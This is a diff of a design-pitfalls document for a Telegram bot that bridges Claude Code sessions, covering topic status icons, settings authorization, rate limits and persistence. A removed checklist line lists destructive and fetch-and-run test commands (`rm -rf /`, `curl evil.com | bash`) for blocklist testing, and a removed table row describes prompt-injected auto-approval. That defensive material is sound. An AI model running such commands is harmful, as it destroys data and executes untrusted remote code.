+Add a `botOwnerId` field to `AppConfig` (from a `BOT_OWNER_ID` environment variable, or auto-populated on first successful command). In all settings callback query handlers, check `ctx.from?.id !== config.botOwnerId` and answer with `show_alert: true` if the check fails: "Only the bot owner can change settings." This check is one line per handler and prevents unauthorized reconfiguration.
 
 **Warning signs:**
-- ENOENT errors when reading subagent transcripts
-- Partial JSON parse errors on the last line of transcript files
-- SubagentStop events arriving without usable transcript content
-- Tilde-prefixed paths failing on the filesystem
+- Settings callback handlers without an `if (ctx.from?.id !== config.botOwnerId)` guard
+- No `BOT_OWNER_ID` or equivalent in `config.ts`
+- Settings commands working for any group member who taps a button
 
 **Phase to address:**
-Phase 4 (subagent visibility). Design around `last_assistant_message` as the primary data source, transcript reading as optional enhancement.
-
----
-
-### Pitfall 11: /clear Session ID Instability
-
-**What goes wrong:**
-When `/clear` fires, the `SessionEnd` (reason: "clear") carries the old session_id. The subsequent `SessionStart` (source: "clear") may carry a DIFFERENT session_id. The bot's session store maps session_id -> SessionInfo. If the session_id changes across `/clear`, the bot cannot find the existing SessionInfo for the new session, and either creates a duplicate session or loses track of the topic thread.
-
-This is the same class of problem as resume detection (Pitfall 1 from the v2.0 research, where `handleSessionStart` already handles `source === 'resume'` by matching on cwd). But `/clear` has an additional complication: the `SessionEnd` has not been fully processed yet when the `SessionStart` arrives.
-
-**Why it happens:**
-Claude Code documentation states that `/clear` fires `SessionEnd` then `SessionStart`, but does not guarantee session_id stability. The existing resume detection logic in `handleSessionStart` (lines 206-219 of handlers.ts) matches by cwd, but this depends on the session still being in "active" state. If `handleSessionEnd` already set status to "closed" (see Pitfall 5), the cwd match fails.
-
-**How to avoid:**
-- Handle `/clear` as a coordinated pair, not as two independent events.
-- In `handleSessionEnd` with `reason === "clear"`: set session status to `"clearing"` (a new state), NOT `"closed"`.
-- In `handleSessionStart` with `source === "clear"`: look for sessions in `"clearing"` state for the same cwd. If found, update the session_id mapping and set status back to `"active"`.
-- Add `getSessionByCwdAndStatus(cwd, "clearing")` to SessionStore for this lookup.
-- If the `SessionStart` (source: "clear") never arrives (e.g., user closes Claude Code during the clear), add a timeout that transitions `"clearing"` sessions to `"closed"` after 30 seconds.
-
-**Warning signs:**
-- Duplicate topics appearing after /clear
-- Session state stuck in "clearing" indefinitely
-- Old session ID in the store, new session ID in hook payloads, topic orphaned
-
-**Phase to address:**
-Phase 3 (/clear topic reuse). Must be implemented alongside Pitfall 5 as a single coordinated change.
+Phase implementing the settings topic. Auth check must be in the callback handler from the first implementation.
 
 ---
 
@@ -317,66 +235,64 @@ Issues that cause confusion or minor bugs but are quickly fixable.
 
 ---
 
-### Pitfall 12: Expanded Content Exceeds Telegram 4096-Char Message Limit
+### Pitfall 11: Gray Status Emoji Conflicting with "Closed" Text in Topic Name
 
 **What goes wrong:**
-User taps "Expand" on a tool call. The full tool input/output is 8,000 characters. The `editMessageText` call fails because the new message exceeds Telegram's 4096-character limit. The edit silently fails (or errors), and the user sees no change.
+The existing `closeTopic()` method in `TopicManager` sets the topic name to `✅ proj-name (done)` and closes the topic. The new color-coded status adds a gray emoji (e.g., ⚫) for "down/inactive" topics. On startup sweep, if the bot sets a closed topic's icon to gray but the topic name still says `✅ proj-name (done)`, the visual signals conflict: gray icon (implies "offline bot") + green check (implies "session done"). Users misread topic state.
+
+**Why it happens:**
+The startup gray sweep calls `editForumTopic` on the icon without considering the current topic name. The `closeTopic` path and the gray sweep path are independent code paths that do not coordinate on the full visual state of the topic.
 
 **How to avoid:**
-- Before editing, check if the expanded content exceeds 4096 characters.
-- If it does, truncate to 3800 characters (leaving room for formatting) and add "... (truncated, full output in file)".
-- Alternatively, send a follow-up document attachment with the full content and edit the message to say "Full output sent as file."
-- The existing `splitForTelegram` utility handles this for new messages but is not wired into the expand/collapse path.
+When setting a topic to gray during the startup sweep, also update the `name` to remove the emoji prefix and replace it with the gray emoji. The name update and icon update happen in the same `editForumTopic` call (both `name` and `icon_custom_emoji_id` are in one request). Alternatively, use the gray emoji in the `closeTopic()` method itself so topics are gray from the moment they close — making the startup sweep unnecessary for most topics.
+
+**Warning signs:**
+- Topics showing conflicting visual signals (gray icon + green check name, or vice versa)
+- `editForumTopic` calls that update only the icon but not the name prefix
 
 **Phase to address:**
-Phase 1 (compact tool output). Validation during expand handler implementation.
+Phase implementing color-coded topic status. The color state encoding (emoji prefix + icon emoji) must be consistent across all code paths that modify topic appearance.
 
 ---
 
-### Pitfall 13: Permission Mode Buttons Overcrowding the Approval Message
+### Pitfall 12: Sticky Message deduplication Using Length Instead of Content
 
 **What goes wrong:**
-The approval message currently has 2 buttons (Approve, Deny). With permission modes, it might grow to 6 buttons (Approve, Deny, Accept All, Same Tool, Safe Only, Until Done). Telegram inline keyboards have a practical limit of how many buttons fit on a mobile screen. Six buttons in a row are unreadable. Multiple rows consume screen space and push the tool details off-screen.
+A simple dedup implementation checks `if (newContent.length === lastSentText.length) skip`. Two status messages with the same length but different context percentages (e.g., "45% ctx" and "55% ctx" — same number of digits) would be considered identical. The status message is not updated, and the displayed context percentage is stale.
+
+**Why it happens:**
+Length comparison is faster and simpler than string comparison. Developers optimize early without considering real-world collision frequency.
 
 **How to avoid:**
-- Keep the primary approval message to 2-3 buttons: "Approve", "Deny", and "Mode..." (a submenu trigger).
-- Tapping "Mode..." edits the message to show the 4 mode options. Tapping any mode option sets the mode AND approves the current tool call.
-- This is a 2-step flow but keeps the primary UI clean.
-- Alternatively, permission modes are set via a separate `/mode` command, not on every approval message. The approval message stays simple (Approve/Deny only) and the current mode is shown in the status message.
+Always compare full string content: `if (text === this.lastSentText) return`. The `StatusMessage.flush()` already does this correctly. The sticky message dedup for the new pin-on-create case should use the same pattern. String comparison for a 150-character status message is negligible overhead.
+
+**Warning signs:**
+- Status message occasionally showing stale context percentage
+- Content length check instead of content equality in dedup logic
+- Unit tests using identical-length but different-content strings, all passing
 
 **Phase to address:**
-Phase 2 (permission modes). UX design before implementation.
+Phase implementing sticky message deduplication. Enforce full string comparison from the start.
 
 ---
 
-### Pitfall 14: SubagentStart Events for Nested Subagents (Agents Spawning Agents)
+### Pitfall 13: getForumTopicIconStickers Called Per Status Update Instead of Once
 
 **What goes wrong:**
-Claude Code supports nested subagents (a Task agent can spawn its own subagents). Each nested subagent fires its own `SubagentStart` and `SubagentStop` events. The bot posts a notification for each one. With 7 parallel subagents, each potentially spawning 2-3 sub-subagents, the user sees 20+ rapid-fire "Agent started" / "Agent stopped" messages, drowning out useful information.
+`getForumTopicIconStickers` returns the set of valid emoji IDs for forum topic icons. If called on every status change (session start, tool call, session end), the bot makes dozens of unnecessary API calls per session, consuming rate limit budget and adding latency to status updates. The sticker set is stable — Telegram does not change it frequently.
+
+**Why it happens:**
+Developers call `getForumTopicIconStickers` in the status update function to "always get fresh data." The function is async and the emoji ID map is not cached at the module level.
 
 **How to avoid:**
-- Track subagent nesting depth. Only display top-level subagent start/stop events in the topic.
-- For nested subagents, aggregate: show "3 sub-agents running" in the status message rather than individual start/stop messages.
-- Use the `agent_id` field to build a parent-child relationship tree if needed (note: the SubagentStart payload does not include a parent_agent_id -- nesting must be inferred from timing/context).
-- Apply the same verbosity filtering to subagent events as to tool calls. In "quiet" mode, suppress all subagent lifecycle messages.
+Call `getForumTopicIconStickers` once at startup. Store the emoji ID mapping in a module-level constant: `const TOPIC_ICON_EMOJIS = { ready: '...', busy: '...', error: '...', down: '...' }`. Log the resolved IDs at startup. If the API call fails at startup, fall back to hardcoded known-good IDs with a warning. Do not call this method again during normal operation.
+
+**Warning signs:**
+- `getForumTopicIconStickers` appearing in code paths that run per tool call
+- API call logs showing `getForumTopicIconStickers` being called more than once per bot process lifetime
 
 **Phase to address:**
-Phase 4 (subagent visibility). Consider during design how to handle agent fan-out.
-
----
-
-### Pitfall 15: Status Message Context Percentage Not Resetting After /clear
-
-**What goes wrong:**
-Known Claude Code bug (GitHub issue #13765): the context_window data in the statusline does not reset after `/clear`. The bot reads context percentage from transcript usage data. After `/clear`, the transcript file may contain stale usage data from the pre-clear session, causing the status message to show "Context: 85%" when the actual usage is ~5%. The user thinks they are running out of context when they just cleared it.
-
-**How to avoid:**
-- On detecting `/clear` (SessionStart source: "clear"), force-reset contextPercent to 0 in the SessionStore.
-- Do not trust the first usage data received after `/clear` -- wait for the second data point which will reflect actual post-clear usage.
-- Update the status message immediately after /clear with explicit "Context: 0%" override.
-
-**Phase to address:**
-Phase 3 (/clear topic reuse). Reset context percentage as part of the /clear handling.
+Phase implementing color-coded topic status. Emoji ID resolution must be in the startup/init path, not the hot path.
 
 ---
 
@@ -386,12 +302,15 @@ Shortcuts that seem reasonable but create long-term problems.
 
 | Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
 |----------|-------------------|----------------|-----------------|
-| Storing expand content in unbounded Map | Simple implementation, always available | Memory leak proportional to session length | Never -- use LRU cache from day one |
-| "Accept All" as a simple boolean bypass | Fast to implement, user gets what they asked for | Security vulnerability, no audit trail, no blocklist | Never -- tiered auto-accept is not much harder |
-| Hardcoding callback_data strings | No abstraction overhead | Hits 64-byte limit when adding features, inconsistent encoding | Only for the existing 2-button approval keyboard |
-| Treating /clear as SessionEnd + SessionStart independently | No code changes to existing handlers | Double-processes, closes then reopens topic, loses state | Never -- /clear must be handled as a coordinated pair |
-| Using agent_transcript_path for subagent display | Rich data about subagent activity | File I/O races, path issues, partial reads | Never as primary -- use last_assistant_message, transcript as optional |
-| Ignoring SubagentStart/Stop hooks | Subagents "just work" without the bot knowing | Users cannot see 60%+ of what Claude is doing (subagent work is invisible) | Only acceptable in MVP if subagent visibility is explicitly deferred |
+| Hardcode emoji IDs for status colors instead of calling `getForumTopicIconStickers` | Simpler implementation, no async startup call | Breaks silently if Telegram retires an emoji ID; no way to know valid alternatives | Never — one startup call is cheap and self-documenting |
+| Store settings topic ID in `sessions.json` instead of `bot-state.json` | Avoid adding a new file | Settings get lost if sessions are reset; semantically wrong (settings are not sessions) | Never |
+| Skip `subagentTracker.start()`/`.stop()` when suppressing output | Simpler suppression code (one fewer call) | Corrupts tool attribution for main agent, breaks subagent depth tracking | Never |
+| `Promise.all()` for the startup gray sweep | Faster sweep | Undocumented `editForumTopic` rate limits cause cascading 429s that stall startup | Never |
+| Compare sticky message content by length instead of full text | Slightly faster comparison | Length collisions cause stale status display | Never — full string comparison is negligible cost |
+| Store runtime settings in environment variables only | No new persistence needed | Settings not configurable at runtime via Telegram; defeats the purpose of the settings topic | Never for settings that the user should be able to change |
+| `bot-state.json` written on every settings change without atomic write | Simpler implementation | Corrupt file on crash leaves bot unable to start (no settings topic, missing config) | Never — always use temp+rename |
+
+---
 
 ## Integration Gotchas
 
@@ -399,13 +318,17 @@ Common mistakes when connecting to external services and APIs.
 
 | Integration | Common Mistake | Correct Approach |
 |-------------|----------------|------------------|
-| Telegram inline keyboards | Encoding full state in callback_data (exceeds 64 bytes) | Server-side lookup with short token in callback_data |
-| Telegram editMessageText | Concurrent edits to the same message from different code paths | Per-message edit lock or dedicate messages to a single editor |
-| Telegram pinChatMessage | No unpinChatMessage call before re-pinning | Unpin all topic messages before pinning new status message |
-| Claude Code /clear hook | Treating SessionEnd(clear) and SessionStart(clear) as independent events | Handle as coordinated pair with intermediate "clearing" state |
-| Claude Code SubagentStart/Stop | Assuming PostToolUse payload contains agent attribution | SubagentStart/Stop for lifecycle, PostToolUse cannot identify which agent made the call |
-| Claude Code session_id stability | Assuming same session_id after /clear or /compact | Match by cwd + state, not by session_id |
-| Telegram answerCallbackQuery | Not answering within 30 seconds (shows permanent spinner) | Always answerCallbackQuery immediately, even if the edit takes longer |
+| Telegram `editForumTopic` | Pass `icon_color` to change status color | Use `icon_custom_emoji_id` — `icon_color` is set once at creation and is not editable |
+| Telegram `editForumTopic` | Call per tool event without debounce | Debounce to minimum 3 seconds per topic; consolidate name + icon into one call |
+| Telegram `getForumTopicIconStickers` | Call on every status update | Call once at startup; cache emoji IDs in module-level constants |
+| Telegram `pinChatMessage` | Pin a new status message without unpinning the old one | Forum topics accumulate pinned messages; unpin old before pinning new, or edit in place |
+| Telegram inline keyboard edit | Edit message text without re-sending `reply_markup` | Telegram Desktop removes buttons when `reply_markup` is omitted on edit |
+| `SubagentTracker` | Skip `start()`/`stop()` when suppressing sub-agent output | Always update tracker state; suppress only the Telegram `batcher.enqueueImmediate()` call |
+| `sessions.json` | Store permanent settings topic ID alongside ephemeral sessions | Use separate `bot-state.json` with atomic write for permanent bot state |
+| Settings callback handlers | Apply to any Telegram user | Always check `ctx.from?.id === config.botOwnerId` before applying settings changes |
+| grammY `apiThrottler` | Assume it protects against ALL rate limits including `editForumTopic` | The transformer-throttler only handles documented limits; `editForumTopic` has undocumented per-topic limits |
+
+---
 
 ## Performance Traps
 
@@ -413,11 +336,12 @@ Patterns that work at small scale but fail as usage grows.
 
 | Trap | Symptoms | Prevention | When It Breaks |
 |------|----------|------------|----------------|
-| Unbounded expand content Map | Memory growth, eventual OOM | LRU cache with 200 entries, 30-min TTL | After ~500 tool calls per session |
-| Expand/collapse callback without debounce | 429 rate limit errors, all bot operations blocked | 2-second debounce per message_id | After 5 rapid taps on same button |
-| SubagentStart/Stop messages for every nested agent | Topic flooded with 20+ lifecycle messages | Show only top-level agents, aggregate nested ones | When Claude uses 7 parallel subagents with nested tasks |
-| Serializing callback_data lookup to JSON on every write | Disk I/O spike, blocking event loop | Batch writes or use in-memory-only with session-end cleanup | After 1000+ tool calls with expand buttons |
-| Per-edit Telegram API calls for status message after /clear | Rate limit hit during rapid post-clear activity | Debounce status updates to 1 per 10 seconds (already done via StatusMessage) | Within first 5 seconds after /clear |
+| Startup sweep over all sessions (not just active) | Startup takes 30+ seconds, multiple 429 errors | Only sweep `getActiveSessions()`, not `getAllSessions()` | Any run after 1+ weeks of use (dozens of historical sessions) |
+| Parallel `editForumTopic` calls on startup | 429 cascade, stalled startup, some topics not updated | Sequential `for...of` with `await`, 300ms minimum gap | More than ~3 concurrent calls |
+| Two independent `editForumTopic` paths for same topic | 429s during active tool use, topic name/icon desync | Consolidate into one debounced path per topic | Immediately during any active session |
+| `getForumTopicIconStickers` called per status update | Rate limit budget consumed, status updates slower | Call once at startup, cache results | After ~30 status updates in a session |
+
+---
 
 ## Security Mistakes
 
@@ -425,11 +349,12 @@ Domain-specific security issues beyond general web security.
 
 | Mistake | Risk | Prevention |
 |---------|------|------------|
-| "Accept All" mode with no blocklist | Remote code execution via prompt injection -- Claude deletes files, installs malware, exfiltrates data | Always maintain a blocklist of dangerous patterns that require manual approval regardless of mode |
-| Permission mode set by any group member | Unauthorized user enables auto-accept in shared group | Verify ctx.from.id against bot owner ID before changing permission mode |
-| callback_data containing session secrets | Other group members can see callback_data in API logs | Use opaque tokens that map to server-side state |
-| Auto-approve persisting after session context changes | User sets "Until Done" for safe task, Claude escalates to risky task in same turn | Reset auto-accept on tool escalation (safe->danger transition within a turn) |
-| No audit log for auto-approved operations | Cannot investigate what happened if something goes wrong | Log all auto-approved tool calls to a separate structured log |
+| Settings callback handlers accessible to all group members | Unauthorized configuration changes (sub-agent visibility, verbosity, permissions) | Check `ctx.from?.id === config.botOwnerId` in every settings callback handler |
+| `bot-state.json` stored world-readable | Settings readable by any local user on the machine | Store in `data/` with 0600 permissions; document this in setup instructions |
+| Settings topic commands not scoped to settings topic threadId | Settings commands typed in session topics or general group processed as settings | Guard all settings handlers with `ctx.message.message_thread_id === settingsTopicThreadId` |
+| Sub-agent suppression state not persisted | User enables verbose sub-agent mode for security review; bot restarts; mode silently resets to silent | Persist all settings in `bot-state.json` with explicit confirmation on change |
+
+---
 
 ## UX Pitfalls
 
@@ -437,29 +362,42 @@ Common user experience mistakes in this domain.
 
 | Pitfall | User Impact | Better Approach |
 |---------|-------------|-----------------|
-| Expand button on every tool call (including Read, Glob, Grep) | Cluttered UI, most expand buttons are never tapped | Only add expand buttons for Write, Edit, Bash with output > 200 chars |
-| Permission mode buttons replacing approve/deny on every message | Cognitive overload, users must parse 6 buttons each time | Separate permission modes to /mode command; approval stays 2 buttons |
-| Subagent start/stop messages as separate notifications | Topic flooded, useful messages pushed out of view | Inline subagent status in the pinned status message |
-| /clear visual separator being a plain text message | Easily missed, blends with regular output | Use a distinctive visual separator: bold line, emoji divider, different formatting |
-| Collapse button text identical to Expand button text | User confused about current state | Use stateful labels: "Show details" / "Hide details" or "[+] Expand" / "[-] Collapse" |
-| Expanded content showing raw JSON for tool input | Technical, hard to read for non-developers | Format expanded content as human-readable: file path, command, diff preview |
+| Startup sweep sets all topics gray simultaneously | All topics flash gray at startup even if sessions are still active | Set topics gray only for `status === 'closed'` sessions; never touch topics of running sessions during sweep |
+| Sub-agent suppression with no summary | User has no idea multi-agent work happened | Post a single summary line on SubagentStop even in silent mode: "Agent finished in 3.2s" (one line, no topic, no expansion) |
+| New pin on every /clear without unpinning old | Topic accumulates pinned messages; Telegram shows multiple pins at top | Unpin old status message before pinning new one in /clear and restart paths |
+| Settings changes requiring bot restart to take effect | User changes sub-agent visibility, nothing changes | All settings must take effect in-process immediately; update in-memory config as well as `bot-state.json` |
+| Settings topic silent to commands typed outside it | `/set_verbosity` in session topic does nothing, no error message | Either accept the command anywhere (with topic guard) or respond with "use the Bot Settings topic" |
+| Color status "gray = down" confused with Telegram's default gray | Users think gray means "topic not configured" | Use a distinct non-gray emoji for "bot offline" state; consider ⚪ (white) or ☁️ instead |
+
+---
 
 ## "Looks Done But Isn't" Checklist
 
 Things that appear complete but are missing critical pieces.
 
-- [ ] **Expand/collapse:** Buttons appear and toggle content, but is the content Map bounded? Kill the bot after 500 tool calls and check memory.
-- [ ] **Expand/collapse:** Works on individual messages, but test with batched messages. Does expanding one tool call in a batch break the others?
-- [ ] **Permission modes:** "Accept Edits" auto-approves Write/Edit, but does it also auto-approve MultiEdit? NotebookEdit? MCP tools that write files?
-- [ ] **Permission modes:** Mode persists in memory, but restart the bot and check. Is the mode still active?
-- [ ] **Permission modes:** "Until Done" resets after the agent stops, but does it reset if the agent compacts? After /clear?
-- [ ] **Subagent visibility:** SubagentStart fires, but is the hook registered in installHooks? Check `~/.claude/settings.json` for the SubagentStart HTTP hook entry.
-- [ ] **Subagent visibility:** Subagent messages appear, but start 7 parallel subagents. Is the topic still readable?
-- [ ] **/clear topic reuse:** /clear reuses the topic, but check: is the old status message unpinned? Is the new one pinned? Is contextPercent reset to 0?
-- [ ] **/clear topic reuse:** /clear works once, but /clear twice in the same topic. Does the second clear also reuse correctly?
-- [ ] **/clear topic reuse:** /clear works, but does the session_id mapping update if Claude Code assigns a new session_id after clear?
-- [ ] **callback_data:** Buttons work in development with short mock IDs, but test with production UUIDs. Do any buttons exceed 64 bytes?
-- [ ] **Security:** "Accept All" mode works, but test with `rm -rf /`, `sudo shutdown`, `curl evil.com | bash`. Are these still blocked?
+- [ ] **Color-coded topic status:** Verify `getForumTopicIconStickers` is called exactly once at startup and emoji IDs are logged. Test that all four states (ready/busy/error/down) produce visually distinct topic icons in Telegram. Test on both mobile and desktop clients.
+
+- [ ] **Color-coded topic status:** Verify `editForumTopic` is not called more than once per 3-second window per topic during a tool-heavy session. Check logs for absence of "Failed to edit topic name" warnings under load.
+
+- [ ] **Startup gray sweep:** Verify sweep only touches `getActiveSessions()`, not `getAllSessions()`. Run with 20+ closed sessions in the store; measure startup time and confirm no 429 errors.
+
+- [ ] **Sub-agent suppression:** Verify `subagentTracker.start()` and `subagentTracker.stop()` are still called even when display is suppressed. Verify tool attribution is correct during and after a suppressed sub-agent run.
+
+- [ ] **Sub-agent suppression:** Verify the setting persists across bot restart. Change to verbose, restart, confirm verbose is active.
+
+- [ ] **Sticky dedup:** After a bot restart, verify a session with an existing `statusMessageId` does NOT create a new pinned status message. Exactly one pin per topic after restart.
+
+- [ ] **Sticky dedup:** Verify a second identical status update within the same session does NOT call `editMessageText`. Confirm by checking API call logs.
+
+- [ ] **Settings topic persistence:** Verify `bot-state.json` is written atomically (temp+rename). Verify on restart the bot reads `settingsTopicThreadId` before registering handlers. Verify exactly one "Bot Settings" topic exists after 3 restarts.
+
+- [ ] **Settings topic isolation:** Text typed in the settings topic does NOT route to any Claude Code session. Commands typed in session topics do NOT trigger settings changes.
+
+- [ ] **Settings auth:** A non-owner user tapping a settings button receives an error alert, not a settings change.
+
+- [ ] **editForumTopic consolidation:** There is exactly one code path per topic that calls `editForumTopic`. Grep for `editForumTopic` and `editTopicName` across the codebase and count call sites.
+
+---
 
 ## Recovery Strategies
 
@@ -467,15 +405,15 @@ When pitfalls occur despite prevention, how to recover.
 
 | Pitfall | Recovery Cost | Recovery Steps |
 |---------|---------------|----------------|
-| callback_data overflow (1) | LOW | Add server-side lookup Map. Migrate existing buttons by adding new callback patterns alongside old ones. Old buttons answered with "Please retry." |
-| Content Map memory leak (2) | LOW | Add LRU eviction. No data loss -- evicted entries show "content expired" on expand. Immediate relief. |
-| Expand/collapse race condition (3) | MEDIUM | Separate batched messages from expandable messages. Requires changing the MessageBatcher to skip expandable tool calls. |
-| Auto-accept security hole (4) | HIGH | Add blocklist immediately. Audit all auto-approved operations from logs. Cannot undo commands already executed. Prevention is critical. |
-| /clear double-processing (5) | MEDIUM | Add "clearing" state and reason checking. Requires coordinated changes to SessionEnd and SessionStart handlers. May need to handle topics that were incorrectly closed (reopen them). |
-| Missing subagent hooks (6) | LOW | Add SubagentStart/SubagentStop to installHooks and handlers. No data loss -- subagent events were simply not captured. |
-| Pin race condition (7) | LOW | Add unpinAllForumTopicMessages call before pinning. One-line fix. |
-| Permission mode lost on restart (8) | LOW | Add persistence field to SessionInfo. The field already serializes to JSON. One-field addition. |
-| Rate limit from expand spam (9) | LOW | Add debounce with timestamp tracking. Immediate fix, no architectural changes. |
+| Multiple settings topics created | LOW | Close/delete duplicate topics in Telegram group; update `bot-state.json` with correct `threadId`; restart bot |
+| icon_color passed to editForumTopic (feature silently broken) | LOW | Replace with `icon_custom_emoji_id` approach; test emoji ID resolution; one-time code change |
+| Sub-agent tracker state corrupted by skipped calls | MEDIUM | Restart bot (tracker resets in memory); fix the suppression logic to keep tracker calls; monitor for "SubagentStop for unknown agent" warnings |
+| Old status messages accumulating as pins after restarts | LOW | Manually unpin old messages in affected topics via Telegram UI; add `reconnect()` path to prevent recurrence |
+| `bot-state.json` corrupt after unclean shutdown | LOW | Delete corrupt file; bot recreates settings topic on next start (users must re-apply settings via the topic) |
+| Startup sweep hitting 429s and stalling | LOW | Restart bot; add sequential sweep with delay; reduce sweep scope to active-only |
+| Settings buttons cleared on Telegram Desktop after edit | MEDIUM | Add `reply_markup` to all `editMessageText` calls in settings paths; existing messages need delete+resend to restore buttons |
+
+---
 
 ## Pitfall-to-Phase Mapping
 
@@ -483,36 +421,33 @@ How roadmap phases should address these pitfalls.
 
 | Pitfall | Prevention Phase | Verification |
 |---------|------------------|--------------|
-| callback_data 64-byte limit (1) | Phase 1: Compact Tool Output | Measure byte length of every callback_data string in tests. Assert <= 64. |
-| Content Map memory leak (2) | Phase 1: Compact Tool Output | Run 500 tool calls in a test session. Check heapUsed before and after. |
-| Edit race conditions (3) | Phase 1: Compact Tool Output | Send expand callback during a batch flush. Verify no corruption. |
-| Auto-accept security (4) | Phase 2: Permission Modes | Test matrix: every permission mode x dangerous command patterns. |
-| /clear double-processing (5) | Phase 3: /clear Topic Reuse | Fire /clear 3 times in sequence. Same topic, no duplicates, correct state. |
-| Missing subagent hooks (6) | Phase 4: Subagent Visibility | Check ~/.claude/settings.json for SubagentStart/SubagentStop HTTP hooks. |
-| Pin race conditions (7) | Phase 3: /clear Topic Reuse | /clear then check: exactly 1 pinned message, correct content. |
-| Permission mode persistence (8) | Phase 2: Permission Modes | Set mode, restart bot, verify mode restored in status message. |
-| Expand/collapse rate limit (9) | Phase 1: Compact Tool Output | Tap expand 10 times in 5 seconds. No 429 errors in logs. |
-| Subagent transcript access (10) | Phase 4: Subagent Visibility | SubagentStop with missing/partial transcript. No crashes, graceful fallback. |
-| /clear session ID instability (11) | Phase 3: /clear Topic Reuse | /clear in a long session. Verify session_id remapping works. |
-| Expanded content exceeds 4096 (12) | Phase 1: Compact Tool Output | Expand a tool call with 10KB output. Content truncated, file attachment sent. |
-| Approval button overcrowding (13) | Phase 2: Permission Modes | Screenshot approval message on mobile. All buttons readable and tappable. |
-| Nested subagent flood (14) | Phase 4: Subagent Visibility | Run a task with 7 parallel agents. Topic remains readable, not flooded. |
-| Context % not resetting after /clear (15) | Phase 3: /clear Topic Reuse | /clear at 85% context. Status message shows ~0% within 5 seconds. |
+| icon_color not editable post-creation (1) | Phase: Color-coded topic status | Test that `editForumTopic` with emoji ID changes topic icon visually; verify no icon_color param in codebase |
+| Sub-agent suppression breaks tracker (2) | Phase: Sub-agent silence by default | Run suppressed sub-agent task; verify tool attribution correct after agent ends |
+| Settings topic ID not persisted (3) | Phase: Settings topic | Restart 3x; verify single settings topic, all settings retained |
+| Startup sweep rate-limiting (4) | Phase: Startup cleanup | Run with 20+ sessions; startup completes in under 5 seconds; zero 429 errors |
+| editForumTopic race condition (5) | Phase: Color-coded topic status | High tool-use session; zero "Failed to edit topic name" warnings in logs |
+| Settings topic routing conflict (6) | Phase: Settings topic | Type text in settings topic; confirm not routed to any session |
+| Sticky dedup fails after restart (7) | Phase: Sticky message deduplication | Restart mid-session; confirm single pin, no new status message sent |
+| Keyboard markup cleared on Desktop (8) | Phase: Settings topic | Edit settings message; confirm buttons persist on Telegram Desktop |
+| Sub-agent visibility setting not persisted (9) | Phase: Sub-agent silence + settings topic | Change to verbose; restart; verify verbose active without user intervention |
+| Settings auth not enforced (10) | Phase: Settings topic | Non-owner taps button; verify error alert, no config change |
+| Gray/closed emoji conflict (11) | Phase: Color-coded topic status | Close a session; verify topic shows consistent gray icon + gray name prefix |
+| Sticky dedup uses length not content (12) | Phase: Sticky message deduplication | Status updates with same-length but different content; verify each triggers edit |
+| getForumTopicIconStickers called per update (13) | Phase: Color-coded topic status | Check logs for single `getForumTopicIconStickers` call at startup only |
+
+---
 
 ## Sources
 
-- [Telegram Bot API - InlineKeyboardButton callback_data](https://core.telegram.org/bots/api#inlinekeyboardbutton) -- HIGH confidence. Official API docs confirming 1-64 byte limit.
-- [Claude Code Hooks Reference](https://code.claude.com/docs/en/hooks) -- HIGH confidence. SessionStart source field, SubagentStart/SubagentStop payloads, SessionEnd reason field.
-- [GitHub Issue #13765: Context tracking not resetting on /clear](https://github.com/anthropics/claude-code/issues/13765) -- HIGH confidence. Known bug affecting status display after /clear.
-- [GitHub Issue #10373: SessionStart hooks not working for new conversations](https://github.com/anthropics/claude-code/issues/10373) -- MEDIUM confidence. Documents timing issues with SessionStart hooks.
-- [grammY Scaling Guide: Flood Limits](https://grammy.dev/advanced/flood) -- HIGH confidence. Official grammY documentation on Telegram rate limits.
-- [grammY Interactive Menus Plugin](https://grammy.dev/plugins/menu) -- HIGH confidence. Memory leak warning about dynamic menu registration.
-- [Enhanced Telegram callback_data with protobuf + base85](https://seroperson.me/2025/02/05/enhanced-telegram-callback-data/) -- MEDIUM confidence. Community pattern for working around the 64-byte limit.
-- [Telegram bot inline buttons with large data](https://medium.com/@knock.nevis/telegram-bot-inline-buttons-with-large-data-950e818c1272) -- MEDIUM confidence. Server-side lookup pattern for callback_data.
-- [Claude Code Subagents Documentation](https://code.claude.com/docs/en/sub-agents) -- HIGH confidence. Subagent types, transcript storage, lifecycle.
-- [GitHub Issue #20531: TaskOutput returns full JSONL transcript](https://github.com/anthropics/claude-code/issues/20531) -- MEDIUM confidence. Documents transcript format and parsing challenges.
-- [Existing codebase analysis](/home/cryptobot/workspace/claude-o-gram/src/) -- HIGH confidence. Direct inspection of current bot.ts, formatter.ts, handlers.ts, topics.ts, session-store.ts, approval-manager.ts.
+- [Telegram MTProto — channels.editForumTopic](https://core.telegram.org/method/channels.editForumTopic) — HIGH confidence. Confirmed: only `title` and `icon_emoji_id` are editable fields. No `icon_color`.
+- [Telegram API — Forum Topics](https://core.telegram.org/api/forum) — HIGH confidence. icon_color must be one of 6 fixed RGB values; set at creation only.
+- [grammY — Scaling Up IV: Flood Limits](https://grammy.dev/advanced/flood) — HIGH confidence. Rate limits are unspecified; auto-retry is the correct approach; do not pre-throttle.
+- [grammY — transformer-throttler plugin](https://grammy.dev/plugins/transformer-throttler) — HIGH confidence. Confirmed: "undocumented rate limits are NOT accounted for by the throttler." Global limits: 30/sec, 20/min per group.
+- [Telegram Desktop bug — inline keyboard markup cleared on edit](https://github.com/telegramdesktop/tdesktop/issues/29501) — MEDIUM confidence. Confirmed cross-platform inconsistency; must always pass `reply_markup` on edit.
+- [Telegram Bot API — getForumTopicIconStickers](https://core.telegram.org/bots/api#getforumtopiciconstickers) — HIGH confidence. Returns Sticker array of valid topic icon emoji.
+- [Telegram Bot API — pinChatMessage](https://core.telegram.org/api/pin) — HIGH confidence. Topics have per-topic pin lists; multiple pins accumulate.
+- Direct codebase analysis: `src/monitoring/subagent-tracker.ts` (tracker state machine), `src/monitoring/status-message.ts` (debounce + lastSentText), `src/sessions/session-store.ts` (persistence), `src/bot/topics.ts` (editForumTopic call sites), `src/index.ts` (reconnect path and initMonitoring) — HIGH confidence.
 
 ---
-*Pitfalls research for: v3.0 UX Overhaul (compact output, permission modes, subagent visibility, /clear reuse)*
-*Researched: 2026-03-01*
+*Pitfalls research for: Claude Code Telegram Bridge v4.0 (color-coded status, sub-agent suppression, sticky dedup, settings topic)*
+*Researched: 2026-03-02*
